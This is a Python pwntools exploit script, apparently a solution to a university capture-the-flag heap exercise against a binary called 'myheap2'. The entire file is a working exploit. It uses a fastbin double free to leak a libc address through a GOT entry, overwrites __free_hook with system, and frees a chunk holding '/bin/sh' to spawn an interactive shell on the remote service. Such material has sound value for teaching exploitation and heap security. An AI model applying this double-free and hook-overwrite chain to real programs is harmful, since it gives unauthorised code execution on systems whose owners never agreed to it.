#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template myheap2
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'myheap2')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('lettieri.iet.unipi.it', 4462)
    else:
        return remote('localhost', 4462)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RPATH:    b'.'

io = start()

import time

def create(k, len=b'08'):
    io.send(b'c')
    time.sleep(0.01)
    io.send(k)
    time.sleep(0.01)
    io.send(len)
    time.sleep(0.01)

def ass(k, value):
    # also frees at the start
    io.send(b'a')
    time.sleep(0.01)
    io.send(k)
    time.sleep(0.01)
    io.send(value)
    time.sleep(0.01)

def free(k):
    io.send(b'd')
    time.sleep(0.01)
    io.send(k)
    time.sleep(0.01)

def search(k):
    io.send(b's')
    time.sleep(0.01)
    io.send(k)
    time.sleep(0.01)
    return io.recv()

create(b'A')
create(b'Z')
create(b'Y')

# double free
free(b'A')
free(b'A') 

# libc.address = *exe.got['dup'] - 0x71a9951b5740

# la roba che scrivo su b finisce su fd di fastbin
create(b'B')
ass(b'B', flat({0: exe.got['dup']-16}))
create(b'O') # O contains exe.got['dup']
create(b'K') # K contains exe.got['dup']

dup_leak = search(b'K')
dup_leak = u64(dup_leak)


libc.address = dup_leak - libc.sym['dup']

# not necessary but if i create a new connection i don't need to create the right variables, i can just re-use them

io.close()
io = start()

# m1cs sploit
create(b'A', b'16')
create(b'P', b'16')
ass(b'P', flat({0: "/bin/sh\x00"}))
create(b'U', b'16')

# double free
free(b'A')
free(b'A')

create(b'M', b'16')
ass(b'M', flat({0: exe.sym['__free_hook']-16}))

create(b'L', b'16')
create(b'Q', b'16')
ass(b'Q', flat({0: libc.sym['system']}))

free(b'P')

io.interactive()
